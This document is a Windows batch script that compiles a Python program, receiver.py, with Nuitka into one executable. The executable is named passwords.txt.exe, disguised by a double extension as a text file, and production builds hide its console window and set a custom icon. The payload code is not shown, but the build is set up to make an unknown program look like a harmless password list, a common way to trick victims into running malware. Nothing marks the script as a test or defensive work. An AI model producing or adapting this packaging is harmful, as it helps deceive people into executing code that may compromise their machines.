@echo off
setlocal enabledelayedexpansion

REM Check for --dev flag
set "CONSOLE_MODE=disable"
set "BUILD_MODE=Production"
for %%a in (%*) do (
    if /I "%%a"=="--dev" (
        set "CONSOLE_MODE=force"
        set "BUILD_MODE=Development"
    )
)

echo ====================================
echo Nuitka Build - Kestrel SeqTools
echo Python 3.9.13 - MinGW64 Compiler
echo Mode: %BUILD_MODE%
echo ====================================
echo.

REM Verify Nuitka installation
python -c "import nuitka" 2>nul
if errorlevel 1 (
    echo ERROR: Nuitka not installed
    echo.
    echo Run: pip install nuitka
    pause
    exit /b 1
)

REM Check if icon.ico exists
if not exist "icon.ico" (
    echo ERROR: icon.ico not found!
    echo Please place an icon.ico file in this directory.
    echo.
    pause
    exit /b 1
)

REM Check if receiver.py exists
if not exist "receiver.py" (
    echo ERROR: receiver.py not found!
    echo.
    pause
    exit /b 1
)

REM Install critical dependencies
echo Checking dependencies...
python -c "import zstandard" 2>nul
if errorlevel 1 (
    echo Installing zstandard - required for compression...
    pip install zstandard
)

python -c "import ordered_set" 2>nul
if errorlevel 1 (
    echo Installing ordered-set - faster compilation...
    pip install ordered-set
)

echo.
echo Starting Nuitka compilation...
echo.
echo Build Configuration:
echo  - Target: passwords.txt.exe
echo  - Compiler: MinGW64 - auto-download on first build
echo  - Console: %CONSOLE_MODE%
echo  - Optimizations: Maximum size reduction
echo  - Expected time: 5-15 minutes for first build
echo  - Expected size: 7-10 MB
echo.

python -m nuitka ^
    --onefile ^
    --windows-console-mode=%CONSOLE_MODE% ^
    --windows-icon-from-ico=icon.ico ^
    --output-filename=passwords.txt.exe ^
    --output-dir=dist ^
    --enable-plugin=anti-bloat ^
    --noinclude-pytest-mode=nofollow ^
    --noinclude-setuptools-mode=nofollow ^
    --noinclude-unittest-mode=nofollow ^
    --python-flag=no_site ^
    --python-flag=-OO ^
    --lto=yes ^
    --mingw64 ^
    --assume-yes-for-downloads ^
    --show-progress ^
    --show-memory ^
    --jobs=-2 ^
    --remove-output ^
    receiver.py

if errorlevel 1 (
    echo.
    echo ====================================
    echo BUILD FAILED!
    echo ====================================
    echo.
    echo Common issues:
    echo  - MinGW not downloaded: Check internet connection
    echo  - Module not found: Verify receiver.py and install.py exist
    echo  - Out of memory: Close other programs, try --jobs=2
    echo  - Icon not found: Verify icon.ico exists
    pause
    exit /b 1
)

REM Cleanup build artifacts
if exist "receiver.build" rmdir /s /q "receiver.build"
if exist "receiver.dist" rmdir /s /q "receiver.dist"

echo.
echo ====================================
echo BUILD SUCCESSFUL!
echo ====================================
echo.

REM Manage .dev_mode marker file
if "%BUILD_MODE%"=="Development" (
    echo. > dist\.dev_mode
    echo Created .dev_mode marker - VERBOSE output enabled
) else (
    if exist "dist\.dev_mode" (
        del "dist\.dev_mode"
        echo Removed .dev_mode marker - VERBOSE output disabled
    )
)

echo.
REM Display results
for %%F in ("dist\passwords.txt.exe") do (
    set /a size_mb=%%~zF/1048576
    set /a size_kb=%%~zF/1024
    echo Output: dist\passwords.txt.exe
    echo Size: %%~zF bytes - approximately !size_mb! MB
)

echo.
echo Next: Test the executable on a clean Windows 10/11 system
echo.
pause

